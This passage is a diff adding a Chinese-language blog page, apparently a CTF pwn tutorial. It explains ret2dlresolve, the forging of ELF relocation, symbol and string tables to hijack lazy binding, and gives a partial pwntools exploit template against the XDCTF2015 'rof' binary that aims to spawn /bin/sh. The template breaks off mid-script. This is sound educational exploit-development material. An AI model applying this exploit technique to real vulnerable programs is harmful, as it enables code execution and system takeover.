@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>AdvanceROP-ret2dlresolve - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。 ELF JMPREL Relocation Table elf-rel函数重定位表，即ELF程序的.rel.plt段。该" /><meta name="keywords" content='CTF, Pwn, 二进制' />
+  <meta itemprop="name" content="AdvanceROP-ret2dlresolve">
+  <meta itemprop="description" content="首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。 ELF JMPREL Relocation Table elf-rel函数重定位表，即ELF程序的.rel.plt段。该">
+  <meta itemprop="datePublished" content="2023-11-03T16:07:37+08:00">
+  <meta itemprop="dateModified" content="2023-11-03T16:07:37+08:00">
+  <meta itemprop="wordCount" content="1818">
+  <meta itemprop="keywords" content="CTF,Pwn,二进制"><meta property="og:url" content="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="AdvanceROP-ret2dlresolve">
+  <meta property="og:description" content="首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。 ELF JMPREL Relocation Table elf-rel函数重定位表，即ELF程序的.rel.plt段。该">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-03T16:07:37+08:00">
+    <meta property="article:modified_time" content="2023-11-03T16:07:37+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="二进制">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="AdvanceROP-ret2dlresolve">
+  <meta name="twitter:description" content="首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。 ELF JMPREL Relocation Table elf-rel函数重定位表，即ELF程序的.rel.plt段。该">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" /><link rel="prev" href="https://alextang.top/articles/2023/11/rop-brop/" /><link rel="next" href="https://alextang.top/articles/2023/11/pcb2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "AdvanceROP-ret2dlresolve",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/11\/advancerop-ret2dlresolve\/"
+    },"genre": "posts","keywords": "CTF, Pwn, 二进制","wordcount":  1818 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/11\/advancerop-ret2dlresolve\/","datePublished": "2023-11-03T16:07:37+08:00","dateModified": "2023-11-03T16:07:37+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>AdvanceROP-ret2dlresolve</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-11-03 16:07:37"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-03">2023-11-03</time></span>&nbsp;<span title="更新于 2023-11-03 16:07:37"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-03">2023-11-03</time></span>&nbsp;<span title="1818 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>首先要对延迟绑定机制做一个补充，即在延迟绑定中使用的表的名称和功能。</p>
+<h1 id="elf-jmprel-relocation-table">ELF JMPREL Relocation Table</h1>
+<p>elf-rel函数重定位表，即ELF程序的.rel.plt段。该段结构的定义如下：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Elf32_Rel</span>       <span class="n">struc</span> <span class="p">;</span> <span class="p">(</span><span class="k">sizeof</span><span class="o">=</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">align</span><span class="o">=</span><span class="mh">0x4</span><span class="p">,</span> <span class="n">copyof_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000000</span> <span class="n">r_offset</span>        <span class="n">dd</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000004</span> <span class="n">r_info</span>          <span class="n">dd</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000000</span><span class="mi">8</span> <span class="n">Elf32_Rel</span>       <span class="n">ends</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中，r_offset是该函数的GOT表的虚拟地址，r_info是该函数在dynsym表中的下标。</p>
+<p>那么如何通过dl_runtime_resolve获得该函数的Rel地址？dl_runtime_resolve的第一个参数为reloc_arg，而rel_plt_addr + reloc_arg的地址即为该函数的rel表地址。</p>
+<h1 id="elf-symbol-table">ELF Symbol Table</h1>
+<p>此表即dynsym表。存放着动态链接函数更多的信息，定义如下：</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Elf32_Sym</span>       <span class="n">struc</span> <span class="p">;</span> <span class="p">(</span><span class="k">sizeof</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">align</span><span class="o">=</span><span class="mh">0x4</span><span class="p">,</span> <span class="n">mappedto_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000000</span> <span class="n">st_name</span>         <span class="n">dd</span> <span class="o">?</span>                    
+</span></span><span class="line"><span class="cl"><span class="mo">00000004</span> <span class="n">st_value</span>        <span class="n">dd</span> <span class="o">?</span>                    
+</span></span><span class="line"><span class="cl"><span class="mo">0000000</span><span class="mi">8</span> <span class="n">st_size</span>         <span class="n">dd</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000000</span><span class="n">C</span> <span class="n">st_info</span>         <span class="n">db</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000000</span><span class="n">D</span> <span class="n">st_other</span>        <span class="n">db</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">0000000</span><span class="n">E</span> <span class="n">st_shndx</span>        <span class="n">dw</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00000010</span> <span class="n">Elf32_Sym</span>       <span class="n">ends</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们关心几点：1、一个ELF32_Sym结构的大小是16，这个将方便我们之后的伪造。2、st_name为该函数名字符串在dynstr表中的偏移。3、st_value应该是该函数相对于libc的偏移地址。（不确定，也不需要用）</p>
+<p>这里我们只需要知道GOT表的重写过程是根据st_name来进行的，我们之后仅需要伪造st_name即可。</p>
+<h1 id="elf-string-table">ELF String Table</h1>
+<p>此表仅存放函数名（字符串），偏移是dynsym表中的st_name。无结构，大致内容如下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231103160922604.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231103160922604.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231103160922604.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231103160922604.png?size=large 2x" sizes="auto" data-title="image-20231103160922604" data-alt="image-20231103160922604" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>以上的三个表均存放在link_map中，而link_map存放在got+4的位置。dl_runtime_resolve的位置在got+8。link_map会在plt[0]中被压入栈中，然后跳转至dl_runtime_resolve函数的位置执行。</p>
+<h1 id="伪造思路">伪造思路</h1>
+<p>由于GOT表重写过程对函数的定位均是通过偏移进行的。这里我们不妨让这个偏移更大一点，大到最后的计算出的实际地址是我们可以控制的地址。然后我们在这个地址上分别写入该函数的.rel.plt表、.dynsym表和.dynstr表为我们想要的函数，那么就可以在plt[0]（也就是延迟绑定的过程中）执行任意函数。</p>
+<p>由于构造所需的空间较大，这里我们的思路如下：</p>
+<ul>
+<li>首先将payload读入伪造栈的位置（一般是bss段的位置）</li>
+<li>然后将栈迁移至伪造栈的位置执行即可。</li>
+</ul>
+<p>迁移栈很简单，我们现在需要知道栈该如何构造才行。这里为了执行system函数，构造栈如下：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698998597486-c432e1a6-814b-4d40-9ff1-916090e7544b.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698998597486-c432e1a6-814b-4d40-9ff1-916090e7544b.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698998597486-c432e1a6-814b-4d40-9ff1-916090e7544b.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1698998597486-c432e1a6-814b-4d40-9ff1-916090e7544b.png?size=large 2x" sizes="auto" data-title="img" data-alt="img" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后，我们使用read函数，将上面构造的栈写入bss位置，并进行栈迁移即可。</p>
+<h1 id="模板">模板</h1>
+<p>详细解释看注释</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rof&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08049351</span>    <span class="c1"># pop esi ; pop edi ; pop ebp ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08049353</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08049165</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x804c028</span>    <span class="c1"># readelf -S rof | grep .bss</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>	<span class="c1"># 弹出下面3个栈单位</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>	<span class="c1"># 栈迁移的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>	<span class="c1">#总共100个字节，下面也得填充到100个字节</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span>	<span class="c1"># 移动ebp至base_stage</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>	<span class="c1">#迁移栈顶，开始执行base+stage + 4位置的代码</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fake dynsym （base_stage + 36）</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynsym</span> <span class="o">=</span> <span class="mh">0x8048248</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynstr</span> <span class="o">=</span> <span class="mh">0x80482e8</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_dynsym</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">36</span>   <span class="c1"># 36 = 4 * 9</span>
+</span></span><span class="line"><span class="cl"><span class="n">alg</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_dynsym</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span>   <span class="c1"># 两者的差可以被0x10整除，因为一个ELF32Sym的大小为固定的0x10，而且需要使用下标定位每个函数的sym</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_dynsym</span> <span class="o">=</span> <span class="n">fake_dynsym</span> <span class="o">+</span> <span class="n">alg</span> <span class="c1"># 0x10对齐</span>
+</span></span><span class="line"><span class="cl"><span class="n">sym_index</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_dynsym</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span>  <span class="c1"># 计算dynsym[sym_index]</span>
+</span></span><span class="line"><span class="cl"><span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">sym_index</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span> <span class="c1"># 根据ELF32_R_SYM(info) ((info)&gt;&gt;8) 反推出.rel.plt中的r_info，其中最低为必须为7   </span>
+</span></span><span class="line"><span class="cl"><span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_dynsym</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="n">dynstr</span>  <span class="c1"># func_name = *(dynstr + st_name) 伪造的st_name就放在fake_sym的后面，而fake_sym的大小是4 * 4 = 16, 所以st_name = （fake_dynsym + 0x10） - dynstr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>   <span class="c1"># 伪造write函数的符号表，按照结构体的规定，该内容将被填入base_stage+36的部位</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fake .rel.plt （base_stage + 28）</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_0</span> <span class="o">=</span> <span class="mh">0x8049030</span>   <span class="c1"># push link_map;jmp dl_runtime_resolve</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x80483a0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_rel_plt</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">28</span>  <span class="c1"># 28 = 4 * 7</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_reloc</span> <span class="o">=</span> <span class="n">fake_rel_plt</span> <span class="o">-</span> <span class="n">rel_plt</span> <span class="c1"># rel_plt + fake_reloc -&gt; base_stage + 28 -&gt; fake_rel_plt</span>
+</span></span><span class="line"><span class="cl"><span class="n">r_offset</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r_info 已经计算完毕</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_rel</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>  <span class="c1"># 伪造write函数.rel.plt内容</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 调用过程：</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .rel.plt + reloc_arg -&gt; write_rel_plt (r_offset r_info)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dynsym[(r_info) &gt;&gt; 8] -&gt; write_sym (st_name st_value)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dynstr[st_name] = &#39;write&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
